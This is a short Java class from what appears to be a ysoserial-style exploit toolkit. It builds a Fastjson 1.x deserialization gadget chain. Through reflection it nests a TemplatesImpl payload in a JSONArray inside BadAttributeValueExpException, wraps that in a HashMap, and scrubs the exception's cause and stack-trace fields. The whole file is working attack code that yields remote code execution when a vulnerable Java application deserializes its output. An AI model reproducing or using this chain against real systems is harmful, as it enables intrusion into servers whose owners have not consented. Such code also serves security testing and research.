package com.mechoy.gadget;

import com.alibaba.fastjson.JSONArray;
import com.mechoy.bean.YsoGadgetBean;
import com.mechoy.gadget.inter.Gadget;
import com.mechoy.utils.FileUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Fastjson1 extends Gadget {
    @Override
    public Object getObject(YsoGadgetBean gadgetBean) throws Exception {
        TemplatesImpl template = null;
        template = super.generateTemplate(gadgetBean);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(template);

        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);

        Field field = exp.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(exp, jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(template,exp);

        // 解决因程序运行导致BadAttributeValueExpException中有一些无用值的问题
        Class<?> aClass = Class.forName("java.lang.Throwable");
        Field cause = aClass.getDeclaredField("cause");
        cause.setAccessible(true);
        cause.set(exp, null);
        StackTraceElement[] stackTraceElements = new StackTraceElement[]{new StackTraceElement("1", "1", "1", 1)};
        Field stackTrace = aClass.getDeclaredField("stackTrace");
        stackTrace.setAccessible(true);
        stackTrace.set(exp, stackTraceElements);

        return hashMap;
    }
}
